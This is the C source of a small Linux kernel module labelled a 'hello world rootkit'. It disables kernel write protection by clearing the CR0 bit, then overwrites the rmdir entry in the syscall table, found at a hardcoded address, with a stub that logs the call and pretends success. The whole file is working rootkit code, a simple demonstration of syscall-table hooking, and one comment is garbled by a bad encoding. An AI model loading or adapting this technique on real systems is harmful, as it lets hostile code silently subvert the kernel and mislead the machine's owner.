#include <linux/module.h>
#include <linux/init.h>
#include <asm/unistd.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("leisheyoufu");
MODULE_DESCRIPTION("hello world rootkit world");


//#define CL_DEBUG
#define CL_INFO

#ifdef CL_DEBUG
	#define CL_PRINT(fmt,args...) printk("CL: %s  %d  "fmt,__FILE__,__LINE__,##args)
#else
	#define CL_PRINT(fmt,args...)
#endif

#ifdef CL_INFO
	#define CL_INFO(fmt,args...) printk("CL info: %s  %d  "fmt,__FILE__,__LINE__,##args)
#else
	#define CL_INFO(fmt,args...)
#endif


void **sys_call_table = (void **)0xc0996360; // from system map
int (*sys_orig_rmdir)(const char *path);
int sys_new_rmdir(const char * path)
{
    CL_INFO("sys_new_rmdir %s\n",path);
    return 0;
}

static unsigned int clear_cr0(void)
{
    unsigned int cr0 = 0;
    unsigned int ret;
    asm volatile("movl %%cr0, %%eax"
                 :"=a"(cr0)
                );
    ret = cr0;
    cr0 &= 0xfffeffff;
    asm volatile("movl %%eax, %%cr0"
                 :
                 :"a"(cr0)
                );
    return ret;
}
static void setback_cr0(unsigned int val) // ½«cr0ÉèÎªval
{
    asm volatile("movl %%eax, %%cr0"
                 :
                 :"a"(val)
                );
}

static int __init rootkit_init(void)
{
    CL_INFO("hello world rootkit_init\n");
    unsigned int cr0;
    CL_INFO("__NR_rmdir = %x\n",__NR_rmdir);
    sys_orig_rmdir = sys_call_table[__NR_rmdir];
    CL_INFO(" sys_call_table[__NR_rmdir] = %x\n",  (unsigned int)sys_call_table[__NR_rmdir]);
    cr0 = clear_cr0();
     CL_INFO(" clear_cr0\n");
    sys_call_table[__NR_rmdir] = sys_new_rmdir;
    setback_cr0(cr0);
    CL_INFO(" sys_call_table[__NR_rmdir] = %x\n", (unsigned int)sys_call_table[__NR_rmdir]);
    return 0;
}
static void __exit rootkit_exit(void)
{
    unsigned int cr0;
    cr0 = clear_cr0();
    sys_call_table[__NR_rmdir] = sys_orig_rmdir;
    setback_cr0(cr0);
    CL_INFO("rootkit_exit\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);


